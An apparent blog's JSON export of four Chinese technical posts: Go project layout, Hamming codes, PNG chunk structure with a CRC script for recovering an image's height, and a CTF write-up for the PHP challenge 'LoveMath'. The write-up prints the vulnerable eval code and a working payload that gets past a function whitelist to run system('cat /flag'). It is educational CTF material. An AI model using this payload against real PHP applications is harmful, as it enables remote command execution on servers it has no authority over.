[{"content":"Go项目布局 官方项目组织推荐 官方项目地址\n在官方文档中，没有明确指出什么类型的组件应该被放置什么位置，只是做了一些比较基本的推荐\nBasic package 对于简单的包，使用单个文件封装即可\n1 2 3 4 project-root-directory/ ├── go.mod ├── modname.go └── modname_test.go Basic command 对于简单的可执行程序，如果程序不太复杂，也可以用单个的go文件来组织\n1 2 3 4 5 6 project-root-directory/ ├── go.mod ├── auth.go ├── auth_test.go ├── client.go └── main.go Package or command with supporting packages 稍微复杂一些的包或可执行程序，可以根据功能拆封成不同目录中。而且官方也推荐创建一个internal目录，防止一些开发者不希望暴露的内部方法暴露。\n1 2 3 4 5 6 7 8 9 10 11 project-root-directory/ ├── internal/ │ ├── auth/ │ │ ├── auth.go │ │ └── auth_test.go │ └── hash/ │ ├── hash.go │ └── hash_test.go ├── go.mod ├── modname.go └── modname_test.go Multiple packages 如果一个模块由多个可导入的包组成，则每个包有自己的目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 project-root-directory/ ├── go.mod ├── modname.go ├── modname_test.go ├── auth/ │ ├── auth.go │ ├── auth_test.go │ └── token/ │ ├── token.go │ └── token_test.go ├── hash/ │ └── hash.go └── internal/ └── trace/ └── trace.go 有一个例子，就是net这个包的组织方式，所以导入的时候，可以使用如下方式导入\n1 2 3 4 import ( \u0026#34;net/http\u0026#34; \u0026#34;net/rpc\u0026#34; ) 类似的，官方还提到了Multiple commands Packages and commands in the same repository Server project等多种布局，推荐阅读查看。\n知名非官方项目规范 最近也看到了一个非官方的项目布局的golang-standards/project-layout的repo，用于大型的复杂项目的文件组织和布局，这里面详细说明了各种组件应该用什么样的方式去组织。\n这些建议，如果按照功能分类，可以按照一下来分：\n应用程序目录 /cmd: 包含项目的主要应用程序。 /internal: 包含私有应用程序和库代码，不希望外部导入。 /pkg: 包含对外公开的库代码。 服务应用程序目录 /api: 包含 OpenAPI/Swagger 规范、JSON 模式文件等。 Web 应用程序目录 /web: 包含 Web 应用程序特定组件，如静态 Web 资产、服务器端模板和单页应用程序。 公共应用程序目录 /configs: 配置文件模板或默认配置。 /init: 系统初始化和进程管理器配置。 /scripts: 执行构建、安装、分析等操作的脚本。 /build: 打包和持续集成配置。 /deployments: IaaS、PaaS、系统和容器编排部署配置和模板。 测试目录 /test: 包含额外的外部测试应用程序和测试数据。 其他目录 /docs: 设计和用户文档。 /tools: 项目的支持工具。 /examples: 应用程序和/或公共库的示例。 /third_party: 外部辅助工具、分叉代码和其他第三方实用程序。 /githooks: Git 钩子。 /assets: 与存储库相关的其他资产（图片、标志等）。 /website: 项目网站数据（如果没有使用 GitHub 页面）。 这个repo还着重强调了，千万不要用/src这种类型的目录，这样可能会导致和go本身的src目录混淆。\n存在的问题 但是这个项目被go的官方人员用不太客气的语气锐评了了\nThere are two problems with this GitHub repo:\nit claims to host Go standards and does not, in the sense that these are in no way official standards the project-layout standard it puts forth is far too complex and not a standard Regarding \u0026ldquo;why not tell us the standard Go project layout and we\u0026rsquo;ll update the doc?\u0026rdquo;, that only addresses point 2. If there really were standards, they would be in the main Go project doc tree. The standard for project layout would also be a lot shorter. I appreciate your trying to provide a useful resource, but calling it \u0026lsquo;golang-standards\u0026rsquo; is claiming more than it is.\nBut for the record, the minimal standard layout for an importable Go repo is really:\nPut a LICENSE file in your root Put a go.mod file in your root Put Go code in your repo, in the root or organized into a directory tree as you see fit That\u0026rsquo;s it. That\u0026rsquo;s the \u0026ldquo;standard\u0026rdquo;.\nIn particular:\nIt is not required to put commands in cmd/. It is not required to put packages in pkg/. It is not required to put web stuff in web/. It is not required to put APIs in api/. It is not required to put web stuff in web/. It is not required to put configurations in configs/. It is not required to put systemd scripts in init/. It is not required to put shell scripts in scripts/. It is not required to put Docker files in build/package/. It is not required to put CI configs in build/ci/. It is not required to put deployment configs in deployments/. It is not required to put test support in test/. It is not required to put documentation in docs/. It is not required to put supporting tools in tools/. It is not required to put examples in examples/. It is not required to put third_party code in third_party/. It is not required to put git hooks in githooks/ It is not required to put static assets in assets/. It is not required to put website data in website/.\nThe importable golang.org/x repos break every one of these \u0026ldquo;rules\u0026rdquo;.\n这段话由Russ Cox在一个issue中提出，大致说了两个事情\n一个项目只要LICENSE，go.mod，还有go的源码就足够了，可以用目录组织go的源代码 这个repo太鸡儿复杂了，不是官方推荐，也不是什么标准 看来go的开发者不太希望大家受到条条框框的限制，希望开发者们以一种灵活资源的方式去开发。\n","permalink":"https://fr000g.github.io/post/tech/go%E9%A1%B9%E7%9B%AE%E5%B8%83%E5%B1%80/","summary":"Go项目布局 官方项目组织推荐 官方项目地址 在官方文档中，没有明确指出什么类型的组件应该被放置什么位置，只是做了一些比较基本的推荐 Basic package 对于简单的","title":"Go项目布局"},{"content":"LoveMath-writeup 前置知识 可变函数 PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。\n可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。\n例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php function foo() { echo \u0026#34;In foo()\u0026lt;br /\u0026gt;\\n\u0026#34;; } function bar($arg = \u0026#39;\u0026#39;) { echo \u0026#34;In bar(); argument was \u0026#39;$arg\u0026#39;.\u0026lt;br /\u0026gt;\\n\u0026#34;; } // 使用 echo 的包装函数 function echoit($string) { echo $string; } $func = \u0026#39;foo\u0026#39;; $func(); // This calls foo() $func = \u0026#39;bar\u0026#39;; $func(\u0026#39;test\u0026#39;); // This calls bar() $func = \u0026#39;echoit\u0026#39;; $func(\u0026#39;test\u0026#39;); // This calls echoit() ?\u0026gt; 这意味着在特定情况下，一次传参的过程中，可以通过?a=($_GET[b])($_GET[c])来执行系统函数，例如：?a=($_GET['b'])($_GET['c']);b=system\u0026amp;c=cat /flag\n​此时，只会对参数a进行检查\n当[]被过滤时，可用{}代替\nbase_convert()函数：在任意进制之间转换数字\n语法\nbase_convert(number,frombase,tobase) 其中，number为原始值，frombase为原进制，tobase为目标进制，支持2-36进制\ndecbin(),dechex(),decoct()等函数，均为进制转换函数\n了解一些php内置的一些math函数，例如上述函数\nhex2bin()函数，将十六进制字符串转换为二进制字符串，可用于做出字符\n题解 题目源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[\u0026#39;c\u0026#39;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[\u0026#39;c\u0026#39;]; if (strlen($content) \u0026gt;= 80) { die(\u0026#34;太长了不会算\u0026#34;); } $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { die(\u0026#34;请不要输入奇奇怪怪的字符\u0026#34;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\u0026#34;请不要输入奇奇怪怪的函数\u0026#34;); } } //帮你算出答案 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); } 观察一下原题\n需要绕过三处，传参长度不超过80，绕过$blacklist，只使用$whitelist中的字段\n理想状态下，构造?c=system('cat /flag')但是空格已经被过滤，考虑上文中的?c=$_GET['a']($_GET['b']);a=system\u0026amp;b=cat /flag\n单引号和双引号被过滤，不使用也可以执行，同时，[]可以用{}代替\n在对参数的检查中，只检查变量c，利用已有函数构建payload\n利用hex2bin函数将数字转为字符串\n首先，构造hex2bin函数\n1 base_convert(37907361743,36,10) 接着，构建_GET字段\n1 base_convert(37907361743,36,10)(dechex(1598506324)) 构建完整payload\n1 ?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pow}($$pi{log})\u0026amp;pow=system\u0026amp;log=cat /flag ","permalink":"https://fr000g.github.io/post/tech/lovemath-writeup/","summary":"LoveMath-writeup 前置知识 可变函数 PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来","title":"LoveMath Writeup"},{"content":"关于海明码编码方式的学习 前言 机组课的海明（汉明）码学的不太行，课本直接不提，老师课件内容和维基百科和各种博客都有些出入，高位低位换来换去的，有些迷糊，重新学习一下（本片以《计算机组成原理》唐朔飞版为主）\n简介 在电信领域中，汉明码（英语：hamming code），也称为海明码，是(7,4)汉明码推广得到的一种线性纠错码，由理查德·卫斯里·汉明于1950年发明。\n用数学术语来说，汉明码是一种二元线性码。对于所有整数 r ≥ 2，存在一个分组长度 n = 2r − 1、k = 2r − r − 1 编码。因此汉明码的码率为 R = k / n = 1 − r / (2r − 1)，对于最小距离为3、分组长度为 2r − 1 的码来说是最高的。汉明码的奇偶检验矩阵的是通过列出所有长度为 r 的非零列向量构成的。\n海明码本质是一种多重奇偶校验码，可检测以为错误\n编码 确定校验位的个数\n2^k^ \u0026gt;= k+n+1\n其中，k为校验位的个数；n为原数据位个数\n确定校验位置：2的幂次数（1，2，4，8……）\n计算校验位\nP1=D3$\\bigoplus$ D5$\\bigoplus$ D7\nP2=D3$\\bigoplus$ D6$\\bigoplus$ D7\nP4=D5$\\bigoplus$ D6$\\bigoplus$ D7\n（直接计1的个数，1的个数为奇数则为1，个数为偶数则为0）\n确定各个校验位的检测位数：\nP1可理解为倒数第一位是1的二进制数，如112(3),1012(5),1112(7)\nP2为倒数第二位是1的二进制数，如112(3),1102(6),1112(7)\nP4位倒数第三位是1的二进制数，如1012(5),1102(6),1112(7)\n通用方法 参见汉明码 - 维基百科，自由的百科全书 (wikipedia.org)\n例 写出1100的海明码\n确定k的位数。n=4，则k=3\n（为了应试，直接记原码与校验码位数关系1-\u0026gt;2；2~4-\u0026gt;3；5~11-\u0026gt;4）\n确定校验码位置，即1，2，4\n计算\nP1=1$\\bigoplus$1$\\bigoplus$0（3，5，7）\nP2=1$\\bigoplus$0$\\bigoplus$0（3，6，7）\nP3=1$\\bigoplus$0$\\bigoplus$0（5，6，7）\n得P1=0 P2=1 P3=1\n则D4=0 D2=1 D1=1\n补全\n位置 D1 D2 D3 D4 D5 D6 D7 值 1 1 1 0 1 0 0 纠错 定义校验位Si\nS1=D1$\\bigoplus$D3$\\bigoplus$ D5$\\bigoplus$ D7\nS2=D2$\\bigoplus$D3$\\bigoplus$ D6$\\bigoplus$ D7\nS3=D4$\\bigoplus$D5$\\bigoplus$ D6$\\bigoplus$ D7\n若S3 S2 S1为000，则无错误；若S3 S2 S1为001，则第一位错误，同理如下\nS3 S2 S1\t000\t001\t010\t011\t100\t101\t110\t111 错误位置\t无\t1\t2\t3\t4\t5\t6\t7 检测出错误位翻转即可\n","permalink":"https://fr000g.github.io/post/tech/hamming/","summary":"关于海明码编码方式的学习 前言 机组课的海明（汉明）码学的不太行，课本直接不提，老师课件内容和维基百科和各种博客都有些出入，高位低位换来换去的，","title":"Hamming"},{"content":"关于PNG文件的学习 文件格式 文件头 89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块\n数据块chunk PNG又两种数据块，关键数据块（critical chunk）与辅助数据块（ancillary chunks）。关键数据块定义4各标准数据块，每个PNG文件都不可缺少\n标准数据块为：IHDR(文件头数据块)、IDAT(图象数据块)、EIND(图象结束数据)\n每个数据块由4部分组成\n名称\t字节数\t说明 length\t4\t指定数据长度 chunk type code\t4\t指定数据类型 chunk data\t可变\t数据 CRC\t4\t校验数据 IHDR 在PNG数据流中唯一，内容共13字节。\n1 2 3 4 5 6 7 8 Width: 4 bytes Height: 4 bytes Bit depth: 1 byte Color type: 1 byte Compression method: 1 byte Filter method: 1 byte Interlace method: 1 byte 后面跟4位CRC，CRC由12-29位数据计算得出 CRC 循环冗余校验（Cyclic Redundancy Check， CRC）是一种根据网络数据包或计算机文件等数据产生简短固定位数校验码的一种信道编码技术，主要用来检测或校验数据传输或者保存后可能出现的错误。它是利用除法及余数的原理来作错误侦测的。\n常见题目 通过修改图片的高度隐写，可通过CRC校验，还原图片\nEXP:\n1 2 3 4 5 6 7 8 9 10 11 import os import binascii import struct misc = open(\u0026#34;img.png\u0026#34;, \u0026#34;rb\u0026#34;).read() for i in range(1920): data = misc[12:16] + struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i) + misc[20:29]#验证宽度 crc32 = binascii.crc32(data) \u0026amp; 0xffffffff if crc32 == 0x37EC2D65:#此处为CRC print(i) 上文中，若验证图片高度，则代码为\n1 data = misc[16:20] + struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i) + misc[24:29] ","permalink":"https://fr000g.github.io/post/tech/png-file-format-learning/","summary":"关于PNG文件的学习 文件格式 文件头 89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块 数据块chunk PNG又两种数据块，关键数据块（critical c","title":"PNG File Format Learning"}]